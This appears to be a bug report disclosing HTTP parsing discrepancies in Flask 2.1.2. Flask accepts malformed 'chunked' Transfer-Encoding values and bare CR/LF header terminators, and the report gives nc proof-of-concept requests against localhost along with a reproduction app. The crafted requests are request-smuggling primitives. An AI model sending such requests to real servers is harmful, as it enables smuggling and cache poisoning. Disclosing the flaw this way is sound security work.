## Parsing discrepancies in Flask

```bash
Versions

Python 3.8.10
Flask 2.1.2
Werkzeug 2.0.2

```
    I'm currently working on a project for my undergraduate course, in which I'm testing for HTTP request parsing discrepancies,
which may lead to various security issues such as request smuggling, web cache poisoning etc. While testing Flask's parsing 
behavior, I discovered that Flask has parsing discrepancies in Transfer-Encoding header. The Transfer-encoding is one of the main
causes for request smuggling as mentioned in RFC 7230's security considerations (see: https://datatracker.ietf.org/doc/html/rfc7230#section-9.5).

The Following discrepancies were found in  <=Flask 2.1.2.


##### Type 1 : [Prefix]chunked[Suffix]
    
1. RFC 7230 states that the Transfer-Encoding header should have one or more of the following values only : transfer-coding = "chunked" / "compress" / "deflate" / "gzip".

2. It was found that Flask accepts Transfer-Encoding header values which have certain prefixes or suffixes attached to the string "chunked". These are 0x0b, 0x0c, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x0d. Flask considers all such modified strings as "chunked" and then parses the body accordingly. However according to RFC 7230, such requests should be treated as bad requests.

3. In addition, as per RFC 7230, the Transfer-Encoding header should be prioritized over Content-Length header. However since the "chunked" string has been modified and violates the RFC ABNF guidlines, other intermediate servers may prioratize the Content-Length header due to the bad "chunked" value which was accepted by Flask.  

> Problem : 

[prefix-char]chunked, chunked[suffix-char]

characters accepted : 0x0b, 0x0c, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x0d

Reference: [RFC](https://datatracker.ietf.org/doc/html/rfc7230#section-4)

N.B. For 0x0d alone only suffix form gets treated as chunked request

#### Type 2 : CRLF Terminating Problem

1. As per RFC 7230 ABNF grammar, the header fields must be terminated with CRLF, but Flask accepts single CR or single LF as well.

X: X [non standard header]

> problem: 
X: X[fuzz]Transfer-Encoding: chunked

Reference: [RFC](https://datatracker.ietf.org/doc/html/rfc7230#appendix-B)

Grammar : HTTP-message = start-line *( header-field CRLF ) CRLF [ message-body]

characters accepted : 0x0a, 0x0d

### POC

##### Type 1

> prefix-09

```bash

     echo -ne 'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Close\r\nTransfer-Encoding: \x0bchunked\r\nContent-Length: 13\r\n\r\n2\r\nyy\r\n0\r\n\r\nX' | nc localhost 5000

```

> suffix-09

```bash
  echo -ne 'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Close\r\nTransfer-Encoding: chunked\x0b\r\nContent-Length: 13\r\n\r\n2\r\nyy\r\n0\r\n\r\nX' | nc localhost 5000
```

#### Type 2

```bash
    echo -ne 'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Close\r\nX: X\x0dTransfer-Encoding: chunked\r\nContent-Length: 13\r\n\r\n2\r\nyy\r\n0\r\n\r\nX' | nc localhost 5000
```

#### Code to Reproduce

```python
from pprint import pprint
from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def serve():
    data = request.get_data().decode()
    pprint(request.headers)
    pprint(data)
    message = f"\n--------\nRequest\n{request.headers}\nBody Length: {len(data)}\nBody: {data}\n"

    with open("output/fuzz.txt", "a+") as f:
        f.write(message)

    return f"Body Length :{len(data)} Body {data}"

if __name__ == "__main__":

    open("output/fuzz.txt", "w").close()
    app.run()
```
